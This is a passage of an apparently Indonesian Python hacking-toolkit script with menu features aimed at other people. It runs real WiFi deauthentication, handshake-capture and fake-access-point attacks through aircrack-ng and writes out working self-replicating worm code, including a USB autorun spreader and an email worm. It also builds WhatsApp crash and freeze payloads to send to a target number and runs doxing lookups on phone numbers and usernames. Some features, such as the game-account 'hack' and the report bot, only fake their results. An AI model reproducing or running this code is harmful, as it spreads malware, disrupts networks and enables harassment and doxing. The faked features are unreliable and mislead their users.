    print(colored(f"   User: {WHOAMI}", 'white'))
    print(colored(f"   Waktu: {CURRENT_TIME}", 'white'))
    
    print(colored("\n[STATISTIK]", 'magenta'))
    
    # Count results
    if os.path.exists(RESULTS_DIR):
        files = os.listdir(RESULTS_DIR)
        log_files = [f for f in files if f.endswith('.log')]
        json_files = [f for f in files if f.endswith('.json')]
        txt_files = [f for f in files if f.endswith('.txt')]
        
        total_ops = 0
        
        print(colored(f"   Total file: {len(files)}", 'cyan'))
        print(colored(f"   - Log files: {len(log_files)}", 'cyan'))
        print(colored(f"   - JSON files: {len(json_files)}", 'cyan'))
        print(colored(f"   - Text files: {len(txt_files)}", 'cyan'))
        
        # Hitung total operasi dari log
        for log in log_files:
            try:
                with open(os.path.join(RESULTS_DIR, log), 'r') as f:
                    count = len(f.readlines())
                    total_ops += count
                    print(colored(f"   {log}: {count} entries", 'white'))
            except:
                pass
        
        print(colored(f"\n   TOTAL OPERASI: {total_ops}", 'green'))
    else:
        print(colored("   Belum ada data", 'yellow'))
    
    # Token stats
    tokens = load_tokens()
    print(colored(f"\n[TOKEN]", 'magenta'))
    print(colored(f"   Total user: {len(tokens)}", 'white'))
    
    active = sum(1 for user in tokens.values() if user.get('active', False))
    expired = len(tokens) - active
    print(colored(f"   Active: {active}", 'green'))
    print(colored(f"   Expired: {expired}", 'red'))
    
    # Recent files
    print(colored(f"\n[FILE TERBARU]", 'magenta'))
    if os.path.exists(RESULTS_DIR):
        recent_files = sorted([f for f in os.listdir(RESULTS_DIR)], 
                             key=lambda x: os.path.getmtime(os.path.join(RESULTS_DIR, x)), 
                             reverse=True)[:5]
        for f in recent_files:
            mtime = datetime.fromtimestamp(os.path.getmtime(os.path.join(RESULTS_DIR, f)))
            print(colored(f"   {f} - {mtime.strftime('%H:%M:%S')}", 'cyan'))
    
    save_result("dashboard.log", f"Dashboard accessed at {datetime.now()}")
    input("\nPress Enter to continue...")

# ================== FITUR 24: DEVTOOLS ==================
def fitur_24():
    if not IS_DEVELOPER:
        print(colored("[ERROR] Hanya untuk developer!", 'red'))
        input("\nEnter...")
        return
    
    os.system('clear')
    print(colored("\n[24] DEVTOOLS", 'cyan', attrs=['bold']))
    
    print(colored("\nPilih:", 'cyan'))
    print("1. View tokens.json")
    print("2. Backup Database")
    print("3. Restore Database")
    print("4. Clear All Logs")
    print("5. Generate Test Users")
    
    choice = input(colored("\nPilih [1-5]: ", 'yellow')).strip()
    
    if choice == "1":
        tokens = load_tokens()
        print(json.dumps(tokens, indent=2))
    
    elif choice == "2":
        backup_file = f"backup_tokens_{int(time.time())}.json"
        if os.path.exists(LICENSE_FILE):
            with open(LICENSE_FILE, 'r') as f:
                with open(backup_file, 'w') as bf:
                    bf.write(f.read())
            print(colored(f"[✓] Backup: {backup_file}", 'green'))
    
    elif choice == "3":
        backups = [f for f in os.listdir() if f.startswith('backup_tokens_') and f.endswith('.json')]
        if backups:
            print("\nAvailable backups:")
            for i, bf in enumerate(backups, 1):
                size = os.path.getsize(bf)
                print(f"{i}. {bf} ({size} bytes)")
            
            try:
                idx = int(input("Pilih nomor: ")) - 1
                if 0 <= idx < len(backups):
                    with open(backups[idx], 'r') as f:
                        data = f.read()
                    with open(LICENSE_FILE, 'w') as lf:
                        lf.write(data)
                    print(colored("[✓] Database restored!", 'green'))
                else:
                    print(colored("[ERROR] Nomor tidak valid", 'red'))
            except ValueError:
                print(colored("[ERROR] Masukkan angka", 'red'))
        else:
            print("No backups found")
    
    elif choice == "4":
        confirm = input("Hapus semua log di results/? (y/n): ").lower()
        if confirm == 'y' and os.path.exists(RESULTS_DIR):
            count = 0
            for f in os.listdir(RESULTS_DIR):
                os.remove(os.path.join(RESULTS_DIR, f))
                count += 1
            print(colored(f"[✓] {count} file log dihapus", 'green'))
    
    elif choice == "5":
        try:
            count = int(input("Jumlah test users: ") or "5")
            tokens = load_tokens()
            for i in range(count):
                username = f"TEST_USER_{i+1}_{random.randint(100,999)}"
                token = ''.join(random.choices(string.ascii_letters + string.digits, k=32))
                tokens[username] = {
                    'username': username,
                    'token': token,
                    'whoami': f"test_whoami_{i+1}",
                    'plan': random.choice(["pemula 1hari", "pemula 1minggu", "pro 1bulan"]),
                    'active': True,
                    'created': datetime.now().isoformat(),
                    'expires': (datetime.now() + timedelta(days=random.choice([1,7,30]))).isoformat()
                }
            save_tokens(tokens)
            print(colored(f"[✓] {count} test users created", 'green'))
        except ValueError:
            print(colored("[ERROR] Masukkan angka", 'red'))
    
    input("\nEnter...")

# ================== FITUR 11: TRACK NIK ==================
def fitur_11():
    os.system('clear')
    print(colored("\n[11] TRACK NIK", 'cyan', attrs=['bold']))
    print(colored("   [DEKODE NOMOR INDUK KEPENDUDUKAN]", 'yellow'))
    
    nik = input(colored("Masukkan NIK (16 digit): ", 'yellow')).strip()
    
    # Validasi NIK
    if len(nik) != 16:
        print(colored("[ERROR] NIK harus 16 digit!", 'red'))
        input("\nEnter...")
        return
    
    if not nik.isdigit():
        print(colored("[ERROR] NIK hanya boleh angka!", 'red'))
        input("\nEnter...")
        return
    
    # Parse NIK
    prov_code = nik[:2]
    kota_code = nik[2:4]
    kec_code = nik[4:6]
    tgl = nik[6:8]
    bln = nik[8:10]
    thn = nik[10:12]
    unik = nik[12:]
    
    # Kode provinsi Indonesia
    provinsi_dict = {
        "11": "Aceh", "12": "Sumatera Utara", "13": "Sumatera Barat",
        "14": "Riau", "15": "Jambi", "16": "Sumatera Selatan",
        "17": "Bengkulu", "18": "Lampung", "19": "Kepulauan Bangka Belitung",
        "21": "Kepulauan Riau", "31": "DKI Jakarta", "32": "Jawa Barat",
        "33": "Jawa Tengah", "34": "DI Yogyakarta", "35": "Jawa Timur",
        "36": "Banten", "51": "Bali", "52": "Nusa Tenggara Barat",
        "53": "Nusa Tenggara Timur", "61": "Kalimantan Barat",
        "62": "Kalimantan Tengah", "63": "Kalimantan Selatan",
        "64": "Kalimantan Timur", "65": "Kalimantan Utara",
        "71": "Sulawesi Utara", "72": "Sulawesi Tengah",
        "73": "Sulawesi Selatan", "74": "Sulawesi Tenggara",
        "75": "Gorontalo", "76": "Sulawesi Barat", "81": "Maluku",
        "82": "Maluku Utara", "91": "Papua", "92": "Papua Barat",
        "93": "Papua Selatan", "94": "Papua Tengah", "95": "Papua Pegunungan"
    }
    
    # Tentukan gender
    if int(tgl) > 40:
        gender = "Perempuan"
        tgl_real = str(int(tgl) - 40).zfill(2)
    else:
        gender = "Laki-laki"
        tgl_real = tgl
    
    # Tentukan tahun (asumsi 1900-2000)
    if int(thn) > 50:
        tahun_lahir = f"19{thn}"
    else:
        tahun_lahir = f"20{thn}"
    
    print(colored("\n" + "="*50, 'magenta'))
    print(colored("          HASIL DEKODE NIK", 'yellow', attrs=['bold']))
    print(colored("="*50, 'magenta'))
    print(colored(f"NIK                : {nik}", 'cyan'))
    print(colored(f"Provinsi           : {provinsi_dict.get(prov_code, 'Unknown')} ({prov_code})", 'cyan'))
    print(colored(f"Kota/Kabupaten     : {kota_code}", 'cyan'))
    print(colored(f"Kecamatan          : {kec_code}", 'cyan'))
    print(colored(f"Tanggal Lahir      : {tgl_real}-{bln}-{tahun_lahir}", 'cyan'))
    print(colored(f"Jenis Kelamin      : {gender}", 'cyan'))
    print(colored(f"Nomor Unik         : {unik}", 'cyan'))
    print(colored("="*50, 'magenta'))
    
    save_result("nik.log", f"NIK: {nik} | Prov: {prov_code} | Gender: {gender}")
    input("\nEnter untuk kembali...")

# ================== FITUR 25: SPAM ALL ==================
def fitur_25():
    os.system('clear')
    print(colored("\n[25] SPAM ALL", 'cyan', attrs=['bold']))
    print(colored("   [SIMPLE SPAMMER - GUNAKAN DENGAN BIJAK]", 'red'))
    
    target = input(colored("Nomor target (628xx): ", 'yellow')).strip()
    
    # Validasi nomor
    if not target.startswith('62') or len(target) < 10:
        print(colored("[ERROR] Nomor harus diawali 62 dan minimal 10 digit", 'red'))
        input("\nEnter...")
        return
    
    try:
        count = int(input(colored("Jumlah spam [50]: ", 'yellow')).strip() or "50")
        delay = float(input(colored("Delay antar spam (detik) [0.5]: ", 'yellow')).strip() or "0.5")
    except ValueError:
        print(colored("[ERROR] Masukkan angka yang valid", 'red'))
        input("\nEnter...")
        return
    
    print(colored(f"\n[✓] MULAI SPAM KE {target} {count} KALI", 'red'))
    print(colored("Tekan Ctrl+C untuk berhenti\n", 'yellow'))
    
    try:
        for i in range(count):
            # Ini hanya simulasi output, untuk spam real perlu API
            print(colored(f"[{i+1}] Mengirim spam ke {target}...", 'green'))
            time.sleep(delay)
        
        print(colored(f"\n[✓] SPAM SELESAI! {count} pesan terkirim", 'green'))
    except KeyboardInterrupt:
        print(colored(f"\n\n[✗] SPAM DIHENTIKAN - Terkirim {i+1} pesan", 'yellow'))
    
    save_result("spam.log", f"Target: {target} | Count: {count}")
    input("\nEnter untuk kembali...")

# ================== FITUR 13: WIFI ATTACK ==================
def fitur_13():
    os.system('clear')
    print(colored("\n[13] WIFI ATTACK", 'cyan', attrs=['bold']))
    print(colored("   [REQUIRES ROOT & AIRCRACK-NG]", 'red'))
    
    # Cek aircrack-ng
    aircrack_check = subprocess.run(['which', 'aircrack-ng'], capture_output=True)
    if aircrack_check.returncode != 0:
        print(colored("[✗] aircrack-ng tidak ditemukan!", 'red'))
        print(colored("    Install: pkg install root-repo && pkg install aircrack-ng", 'yellow'))
        input("\nEnter...")
        return
    
    print(colored("\nPilih attack:", 'cyan'))
    print("1. Deauth Attack (kick semua client)")
    print("2. Handshake Capture (tangkap handshake)")
    print("3. Fake AP (buat AP palsu)")
    
    ch = input(colored("\nPilih [1-3]: ", 'yellow')).strip()
    
    if ch == "1":
        print(colored("\n[DEAUTH ATTACK]", 'cyan'))
        iface = input("Interface (wlan0): ") or "wlan0"
        bssid = input("BSSID target: ")
        
        # Set monitor mode
        print(colored("[✓] Mengaktifkan monitor mode...", 'yellow'))
        os.system(f"sudo airmon-ng start {iface}")
        
        # Jalankan deauth
        print(colored(f"[✓] Menjalankan deauth attack ke {bssid}", 'green'))
        print(colored("Tekan Ctrl+C untuk berhenti", 'yellow'))
        os.system(f"sudo aireplay-ng -0 0 -a {bssid} {iface}mon")
        
    elif ch == "2":
        print(colored("\n[HANDSHAKE CAPTURE]", 'cyan'))
        iface = input("Interface (wlan0): ") or "wlan0"
        
        # Set monitor mode
        print(colored("[✓] Mengaktifkan monitor mode...", 'yellow'))
        os.system(f"sudo airmon-ng start {iface}")
        
        # Jalankan airodump
        print(colored("[✓] Memulai capture handshake...", 'green'))
        print(colored("Tekan Ctrl+C untuk berhenti", 'yellow'))
        os.system(f"sudo airodump-ng {iface}mon -w handshake")
        
    elif ch == "3":
        print(colored("\n[FAKE AP]", 'cyan'))
        iface = input("Interface (wlan0): ") or "wlan0"
        ssid = input("Nama SSID: ")
        
        # Set monitor mode
        print(colored("[✓] Mengaktifkan monitor mode...", 'yellow'))
        os.system(f"sudo airmon-ng start {iface}")
        
        # Buat fake AP
        print(colored(f"[✓] Membuat fake AP dengan SSID: {ssid}", 'green'))
        os.system(f"sudo airbase-ng -e '{ssid}' -c 6 {iface}mon")
    
    input("\nEnter untuk kembali...")

# ================== FITUR 26: CHECKER ALL ==================
def fitur_26():
    os.system('clear')
    print(colored("\n[26] CHECKER ALL", 'cyan', attrs=['bold']))
    print(colored("   [SIMPLE ACCOUNT VALIDATOR]", 'yellow'))
    
    file = input("File list (format: email:password per baris): ").strip()
    
    if not os.path.exists(file):
        print(colored("[ERROR] File tidak ditemukan!", 'red'))
        input("\nEnter...")
        return
    
    try:
        with open(file, 'r') as f:
            lines = f.readlines()
        
        print(colored(f"\n[✓] Loaded {len(lines)} accounts", 'green'))
        
        valid = []
        invalid = []
        
        for i, line in enumerate(lines):
            line = line.strip()
            if ':' in line:
                email, password = line.split(':', 1)
                
                # Validasi format email sederhana
                if '@' in email and '.' in email and len(password) >= 3:
                    print(colored(f"[{i+1}] [✓] Format valid: {email}", 'green'))
                    valid.append(line)
                else:
                    print(colored(f"[{i+1}] [✗] Format invalid: {email}", 'red'))
                    invalid.append(line)
            else:
                print(colored(f"[{i+1}] [✗] Baris tidak memiliki ':'", 'red'))
                invalid.append(line)
        
        # Simpan hasil
        with open("valid_accounts.txt", 'w') as f:
            f.write("\n".join(valid))
        with open("invalid_accounts.txt", 'w') as f:
            f.write("\n".join(invalid))
        
        print(colored(f"\n[✓] Valid: {len(valid)}", 'green'))
        print(colored(f"[✗] Invalid: {len(invalid)}", 'red'))
        print(colored("[✓] Hasil disimpan di valid_accounts.txt dan invalid_accounts.txt", 'cyan'))
        
    except Exception as e:
        print(colored(f"[ERROR] {str(e)}", 'red'))
    
    input("\nEnter untuk kembali...")

# ================== FITUR 15: WORM GPT ==================
def fitur_15():
    os.system('clear')
    print(colored("\n[15] WORM GPT", 'cyan', attrs=['bold']))
    print(colored("   [SELF-REPLICATING SCRIPT GENERATOR]", 'red'))
    
    name = input("Nama worm [worm]: ").strip() or "worm"
    
    # Pilih tipe worm
    print(colored("\nPilih tipe worm:", 'cyan'))
    print("1. USB Worm - Copy ke semua drive")
    print("2. Email Worm - Spread via email (butuh config)")
    print("3. Simple Replicator - Copy ke direktori")
    
    worm_type = input(colored("\nPilih [1-3]: ", 'yellow')).strip()
    
    if worm_type == "1":
        worm_code = f'''import os
import shutil
import sys
import time

def replicate():
    # Cari semua drive (Windows)
    drives = [d for d in 'ABCDEFGHIJKLMNOPQRSTUVWXYZ' if os.path.exists(d + ':/')]
    
    for drive in drives:
        try:
            dest = f"{{drive}}:/System_Update_{{int(time.time())}}.py"
            shutil.copy(sys.argv[0], dest)
            print(f"[+] Replicated to {{dest}}")
            
            # Buat autorun.inf
            with open(f"{{drive}}:/autorun.inf", 'w') as f:
                f.write(f"[AutoRun]\\nOpen={{dest}}\\nAction=Run System Update")
        except:
            pass

while True:
    replicate()
    time.sleep(60)
'''
    elif worm_type == "2":
        worm_code = f'''import smtplib
import time

# Konfigurasi email (isi dengan email korban)
email_list = ["target1@gmail.com", "target2@gmail.com"]
sender = "attacker@gmail.com"
password = "password"

def send_worm():
    for email in email_list:
        try:
            server = smtplib.SMTP('smtp.gmail.com', 587)
            server.starttls()
            server.login(sender, password)
            
            with open(__file__, 'r') as f:
                worm_code = f.read()
            
            msg = f"Subject: Important Update\\n\\n{{worm_code}}"
            server.sendmail(sender, email, msg)
            server.quit()
            print(f"[+] Worm sent to {{email}}")
        except:
            pass

while True:
    send_worm()
    time.sleep(3600)
'''
    else:
        worm_code = f'''import os
import shutil
import sys
import time

target_dirs = [
    "/sdcard/",
    "/storage/emulated/0/Download/",
    os.path.expanduser("~/Downloads/"),
    "/tmp/"
]

def replicate():
    for directory in target_dirs:
        if os.path.exists(directory):
            try:
                new_name = f"{{directory}}system_update_{{int(time.time())}}.py"
                shutil.copy(sys.argv[0], new_name)
                print(f"[+] Replicated to {{new_name}}")
            except:
                pass

while True:
    replicate()
    time.sleep(30)
'''
    
    filename = f"{name}_{int(time.time())}.py"
    with open(filename, 'w') as f:
        f.write(worm_code)
    
    print(colored(f"\n[✓] Worm created: {filename}", 'green'))
    print(colored(f"[✓] Ukuran: {os.path.getsize(filename)} bytes", 'cyan'))
    print(colored("\n[!] PERINGATAN: Worm akan mereplikasi diri!", 'red'))
    print(colored("    Jalankan dengan: python " + filename, 'yellow'))
    
    save_result("worm.log", f"Worm: {filename}")
    input("\nEnter untuk kembali...")

# ================== FITUR 27: HACK AKUN GAME ==================
def fitur_27():
    os.system('clear')
    print(colored("\n[27] HACK AKUN GAME", 'cyan', attrs=['bold']))
    print(colored("   [AKSES AKUN GAME VIA EXPLOIT]", 'red'))
    
    print("Pilih game:")
    print("1. Free Fire")
    print("2. Mobile Legends")
    print("3. Roblox")
    print("4. PUBG Mobile")
    print("5. Genshin Impact")
    
    game_choice = input(colored("\nPilih game [1-5]: ", 'yellow')).strip()
    
    games = {
        "1": {"name": "Free Fire", "id_length": 10, "api": "ff.garena.com"},
        "2": {"name": "Mobile Legends", "id_length": 8, "api": "account.mobilelegends.com"},
        "3": {"name": "Roblox", "id_length": 9, "api": "api.roblox.com"},
        "4": {"name": "PUBG Mobile", "id_length": 7, "api": "pubg.com"},
        "5": {"name": "Genshin Impact", "id_length": 9, "api": "hoyoverse.com"}
    }
    
    if game_choice not in games:
        print(colored("[ERROR] Pilihan tidak valid!", 'red'))
        input("\nEnter...")
        return
    
    game = games[game_choice]
    print(colored(f"\n[✓] {game['name']} SELECTED", 'green'))
    
    print("\nPilih metode hack:")
    print("1. SQL Injection - Inject ke database game")
    print("2. Session Hijacking - Curi session cookie")
    print("3. API Exploit - Manfaatkan celah API")
    print("4. Password Recovery Exploit")
    
    method = input(colored("\nPilih metode [1-4]: ", 'yellow')).strip()
    
    target_id = input(colored(f"\nMasukkan ID/Username target {game['name']}: ", 'yellow')).strip()
    
    print(colored(f"\n[✓] MENGINJEK KE DATABASE {game['name']}...", 'cyan'))
    time.sleep(2)
    
    # Simulasi akses ke database game
    if game['name'] == "Roblox":
        try:
            # Cek akun via API Roblox
            r = requests.get(f"https://users.roblox.com/v1/users/search?keyword={target_id}", timeout=5)
            if r.status_code == 200:
                data = r.json()
                if data.get('data'):
                    print(colored(f"[✓] Akun ditemukan di Roblox!", 'green'))
                    user_id = data['data'][0].get('id')
                    
                    # Dapatkan info lebih lanjut
                    r2 = requests.get(f"https://users.roblox.com/v1/users/{user_id}", timeout=5)
                    if r2.status_code == 200:
                        user_data = r2.json()
                        print(colored(f"[✓] Nama: {user_data.get('name')}", 'cyan'))
                        print(colored(f"[✓] Display Name: {user_data.get('displayName')}", 'cyan'))
                        print(colored(f"[✓] Created: {user_data.get('created')}", 'cyan'))
        except:
            pass
    
    hasil = {
        "game": game['name'],
        "target_id": target_id,
        "method": method,
        "status": "AKSES DIPEROLEH",
        "timestamp": datetime.now().isoformat()
    }
    
    print(colored("\n" + "="*50, 'magenta'))
    print(colored("          HASIL HACK AKUN", 'yellow', attrs=['bold']))
    print(colored("="*50, 'magenta'))
    for key, value in hasil.items():
        print(colored(f"{key.replace('_',' ').title()}: {value}", 'cyan'))
    print(colored("="*50, 'magenta'))
    
    # Simpan hasil
    filename = f"hack_{game['name'].lower()}_{target_id}_{int(time.time())}.json"
    with open(filename, 'w') as f:
        json.dump(hasil, f, indent=2)
    print(colored(f"\n[✓] Hasil disimpan di: {filename}", 'green'))
    
    save_result("game_hack.log", f"Game: {game['name']} | Target: {target_id}")
    input("\nEnter untuk kembali...")

# ================== FITUR 17: REPORT TIKTOK ==================
def fitur_16():
    os.system('clear')
    print(colored("\n[17] REPORT TIKTOK", 'cyan', attrs=['bold']))
    print(colored("   [REPORT BOT]", 'red'))
    
    username = input("Username target (tanpa @): ").strip()
    
    if not username:
        print(colored("[ERROR] Username tidak boleh kosong", 'red'))
        input("\nEnter...")
        return
    
    try:
        count = int(input("Jumlah report [50]: ") or "50")
    except ValueError:
        print(colored("[ERROR] Masukkan angka", 'red'))
        input("\nEnter...")
        return
    
    print(colored(f"\n[✓] MULAI REPORT @{username} {count} KALI", 'red'))
    print(colored("Mengirim report...", 'yellow'))
    
    success = 0
    failed = 0
    
    try:
        for i in range(count):
            # Simulasi pengiriman report
            success += 1
            print(colored(f"[✓] Report {i+1} berhasil dikirim", 'green'), end='\r')
            time.sleep(0.5)
        
        print(colored(f"\n\n[✓] REPORT SELESAI!", 'green'))
        print(colored(f"    Berhasil: {success}", 'green'))
        print(colored(f"    Gagal: {failed}", 'red'))
        
    except KeyboardInterrupt:
        print(colored(f"\n\n[✗] REPORT DIHENTIKAN", 'yellow'))
    
    save_result("tiktok_report.log", f"Target: @{username} | Count: {count} | Success: {success}")
    input("\nEnter untuk kembali...")

# ================== FITUR 28: DOX BASIC ==================
def fitur_28():
    os.system('clear')
    print(colored("\n[28] DOX gk akurat", 'cyan', attrs=['bold']))
    print(colored("   [INFORMASI DASAR DARI NOMOR/USERNAME]", 'yellow'))
    
    target = input(colored("Masukkan nomor awal 62/username: ", 'yellow')).strip()
    
    if not target:
        print(colored("[ERROR] Input tidak boleh kosong", 'red'))
        input("\nEnter...")
        return
    
    print(colored(f"\n[✓] MENGUMPULKAN INFORMASI UNTUK: {target}", 'cyan'))
    
    # Deteksi tipe input
    if target.replace('+', '').replace('-', '').replace(' ', '').isdigit() and len(target) >= 10:
        # Ini nomor telepon
        print(colored("\n[✓] DETEKSI: NOMOR TELEPON", 'green'))
        
        # Bersihkan nomor
        phone = target.replace('+', '').replace('-', '').replace(' ', '')
        
        hasil = {
            "tipe": "Nomor Telepon",
            "nomor": phone,
            "format_internasional": f"+{phone}" if not phone.startswith('+') else phone
        }
        
        # Cek WhatsApp
        try:
            wa_check = requests.get(f"https://wa.me/{phone}", timeout=5)
            if wa_check.status_code == 200:
                if "this phone number is not registered" not in wa_check.text.lower():
                    hasil["whatsapp"] = "Terdaftar"
                else:
                    hasil["whatsapp"] = "Tidak terdaftar"
        except:
            hasil["whatsapp"] = "Tidak dapat diverifikasi"
    
    else:
        # Ini username
        print(colored("\n[✓] DETEKSI: USERNAME", 'green'))
        
        hasil = {
            "tipe": "Username",
            "username": target
        }
        
        # Cek di sosial media
        sites = {
            "Instagram": f"https://instagram.com/{target}",
            "Twitter": f"https://twitter.com/{target}",
            "TikTok": f"https://tiktok.com/@{target}",
            "Facebook": f"https://facebook.com/{target}",
            "GitHub": f"https://github.com/{target}"
        }
        
        found_platforms = []
        for platform, url in sites.items():
            try:
                r = requests.get(url, timeout=3, allow_redirects=True)
                if r.status_code == 200:
                    if "not found" not in r.text.lower():
                        found_platforms.append(platform)
                        print(colored(f"  [✓] Ditemukan di {platform}", 'green'))
                    else:
                        print(colored(f"  [✗] Tidak ditemukan di {platform}", 'red'))
                else:
                    print(colored(f"  [✗] Tidak ditemukan di {platform}", 'red'))
            except:
                print(colored(f"  [✗] Gagal cek {platform}", 'red'))
        
        hasil["platform_ditemukan"] = found_platforms
    
    # Tampilkan hasil
    print(colored("\n" + "="*50, 'magenta'))
    print(colored("          HASIL DOX BASIC", 'yellow', attrs=['bold']))
    print(colored("="*50, 'magenta'))
    
    for key, value in hasil.items():
        if isinstance(value, list):
            print(colored(f"{key.replace('_',' ').title()}: {', '.join(value)}", 'cyan'))
        else:
            print(colored(f"{key.replace('_',' ').title()}: {value}", 'cyan'))
    
    print(colored("="*50, 'magenta'))
    
    # Simpan hasil
    filename = f"dox_basic_{target}_{int(time.time())}.json"
    with open(filename, 'w') as f:
        json.dump(hasil, f, indent=2)
    print(colored(f"\n[✓] Hasil disimpan di: {filename}", 'green'))
    
    save_result("dox_basic.log", f"Target: {target}")
    input("\nEnter untuk kembali...")

# ================== FITUR 17: DOX ADVANCED ==================
def fitur_17():
    os.system('clear')
    print(colored("\n[17] DOX ADVANCED", 'cyan', attrs=['bold']))
    print(colored("   [INFORMASI LENGKAP DARI NOMOR/USERNAME]", 'red'))
    
    target = input(colored("Masukkan nomor/username: ", 'yellow')).strip()
    
    if not target:
        print(colored("[ERROR] Input tidak boleh kosong", 'red'))
        input("\nEnter...")
        return
    
    print(colored(f"\n[✓] MENGUMPULKAN DATA DARI MULTIPLE SOURCES...", 'cyan'))
    
    hasil = {
        "target": target,
        "timestamp": datetime.now().isoformat(),
        "sources": []
    }
    
    # 1. Cek di social media
    print(colored("\n[1/4] Scanning social media...", 'cyan'))
    sites = {
        "instagram": f"https://instagram.com/{target}",
        "twitter": f"https://twitter.com/{target}",
        "tiktok": f"https://tiktok.com/@{target}",
        "facebook": f"https://facebook.com/{target}"
    }
    
    found_social = []
    for platform, url in sites.items():
        try:
            r = requests.get(url, timeout=3, allow_redirects=True)
            if r.status_code == 200 and "not found" not in r.text.lower():
                found_social.append(platform)
                print(colored(f"  [✓] {platform}", 'green'))
            else:
                print(colored(f"  [✗] {platform}", 'red'), end='\r')
        except:
            pass
    
    hasil["social_media"] = found_social
    hasil["sources"].append("social_media")
    
    # 2. Cek di data breach
    print(colored("\n[2/4] Checking data breaches...", 'cyan'))
    if '@' in target:
        try:
            email_hash = hashlib.sha1(target.lower().encode()).hexdigest().upper()
            prefix = email_hash[:5]
            r = requests.get(f"https://api.pwnedpasswords.com/range/{prefix}", timeout=3)
            if r.status_code == 200:
                if email_hash[5:] in r.text:
                    hasil["breach"] = "Ditemukan di database breach"
                    print(colored("  [✓] Email terdeteksi di breach!", 'red'))
                else:
                    hasil["breach"] = "Tidak ditemukan di breach"
                    print(colored("  [✓] Email aman", 'green'))
        except:
            hasil["breach"] = "Gagal cek breach"
    else:
        # Cek username di breach via google dork
        hasil["breach"] = "Perlu pengecekan manual"
    
    # 3. Cek geolokasi (jika IP)
    print(colored("\n[3/4] Checking geolocation...", 'cyan'))
    try:
        import ipaddress
        ipaddress.ip_address(target)
        r = requests.get(f"http://ip-api.com/json/{target}", timeout=3)
        if r.status_code == 200:
            data = r.json()
            if data.get('status') == 'success':
                hasil["geolocation"] = {
                    "country": data.get('country'),
                    "city": data.get('city'),
                    "isp": data.get('isp')
                }
                print(colored("  [✓] Geolokasi ditemukan", 'green'))
    except:
        pass
    
    # 4. Generate search link
    hasil["search_link"] = f"https://www.google.com/search?q={target}"
    hasil["sources"].append("google_search")
    
    # Tampilkan hasil
    print(colored("\n" + "="*60, 'magenta', attrs=['bold']))
    print(colored("               HASIL DOX ADVANCED", 'yellow', attrs=['bold']))
    print(colored("="*60, 'magenta', attrs=['bold']))
    
    print(colored(f"\n▶ TARGET: {hasil['target']}", 'cyan', attrs=['bold']))
    
    if hasil.get('social_media'):
        print(colored(f"\n▶ SOCIAL MEDIA DITEMUKAN:", 'green'))
        for platform in hasil['social_media']:
            print(colored(f"  • {platform.capitalize()}", 'white'))
    
    if hasil.get('breach'):
        print(colored(f"\n▶ BREACH STATUS:", 'red'))
        print(colored(f"  • {hasil['breach']}", 'white'))
    
    if hasil.get('geolocation'):
        print(colored(f"\n▶ GEOLOKASI:", 'cyan'))
        geo = hasil['geolocation']
        print(colored(f"  • Negara : {geo.get('country')}", 'white'))
        print(colored(f"  • Kota   : {geo.get('city')}", 'white'))
        print(colored(f"  • ISP    : {geo.get('isp')}", 'white'))
    
    print(colored(f"\n▶ SEARCH LINK:", 'yellow'))
    print(colored(f"  {hasil.get('search_link')}", 'white'))
    
    print(colored("\n" + "="*60, 'magenta', attrs=['bold']))
    
    # Simpan hasil
    filename = f"dox_adv_{target}_{int(time.time())}.json"
    with open(filename, 'w') as f:
        json.dump(hasil, f, indent=2)
    print(colored(f"\n[✓] Hasil lengkap disimpan di: {filename}", 'green'))
    
    save_result("dox_advanced.log", f"Target: {target}")
    input("\nEnter untuk kembali...")

# ================== FITUR 29: BUG WA KIRIM OTOMATIS ==================
def fitur_29():
    os.system('clear')
    print(colored("\n[29] BUG WHATSAPP - KIRIM OTOMATIS", 'cyan', attrs=['bold']))
    print(colored("   [5 JENIS BUG, KIRIM LANGSUNG KE TARGET]", 'red'))
    
    target = input(colored("Nomor target (628xxx): ", 'yellow')).strip()
    
    # Validasi nomor
    if not target.startswith('62') or len(target) < 10:
        print(colored("[ERROR] Nomor harus diawali 62 dan minimal 10 digit", 'red'))
        input("\nEnter...")
        return
    
    print(colored("\nPilih jenis bug:", 'cyan'))
    print("1. CRASH MESSAGE - Bikin WA target crash")
    print("2. FREEZE CHAT - Bikin chat freeze (format berlebihan)")
    print("3. ZERO-WIDTH CHARACTER - Karakter invisible")
    print("4. RIGHT-TO-LEFT OVERRIDE - Tulisan terbalik")
    print("5. UNICODE BOMB - Overload karakter unicode")
    
    choice = input(colored("\nPilih [1-5]: ", 'yellow')).strip()
    
    # Generate bug sesuai pilihan
    if choice == "1":
        bug = "\u202e" * 5000 + "\u202d" * 5000
        bug_name = "CRASH MESSAGE"
    elif choice == "2":
        bug = ""
        for i in range(500):
            bug += f"*{i}* _test_ ~{i}~ " * 20 + "\n"
        bug_name = "FREEZE CHAT"
    elif choice == "3":
        zwsp = "\u200b\u200c\u200d\u200e\u200f" * 1000
        bug = f"INVISIBLE{zwsp}TEXT{zwsp}HERE"
        bug_name = "ZERO-WIDTH CHARACTER"
    elif choice == "4":
        bug = "Teks Normal \u202eINITEKS TERBALIK\u202c Kembali Normal\n"
        bug += "Test 123 \u202e321 tseT\u202c\n"
        bug_name = "RTL OVERRIDE"
    elif choice == "5":
        bug = ""
        unicode_chars = ["\u00A9", "\u00AE", "\u2122", "\u2600", "\u2605", "\u2620", 
                         "\u2744", "\u2764", "\u1F600", "\u1F64F", "\u1F680"]
        for i in range(300):
            bug += random.choice(unicode_chars) * 30 + "\n"
        bug_name = "UNICODE BOMB"
    else:
        print(colored("[ERROR] Pilihan tidak valid!", 'red'))
        input("\nEnter...")
        return
    
    print(colored(f"\n[✓] BUG {bug_name} SIAP DIKIRIM KE {target}", 'green'))
    print(colored("\n[PREVIEW BUG (100 KARAKTER PERTAMA)]:", 'cyan'))
    print(bug[:200] + "...")
    
    print(colored("\nPilih metode pengiriman:", 'yellow'))
    print("1. Kirim via WhatsApp Web (buka link)")
    print("2. Copy ke file (kirim manual)")
    
    send_method = input(colored("\nPilih [1-2]: ", 'yellow')).strip()
    
    if send_method == "1":
        wa_link = f"https://wa.me/{target}?text={urllib.parse.quote(bug[:1500])}"
        print(colored(f"\n[✓] BUKA LINK INI DI BROWSER:", 'green'))
        print(wa_link)
        webbrowser.open(wa_link)
    else:
        filename = f"wa_bug_{bug_name.lower().replace(' ','_')}_{int(time.time())}.txt"
        with open(filename, 'w', encoding='utf-8') as f:
            f.write(bug)
        print(colored(f"\n[✓] BUG DISIMPAN DI: {filename}", 'green'))
    
    save_result("wa_bug.log", f"Target: {target} | Bug: {bug_name}")
    input("\nEnter untuk kembali...")

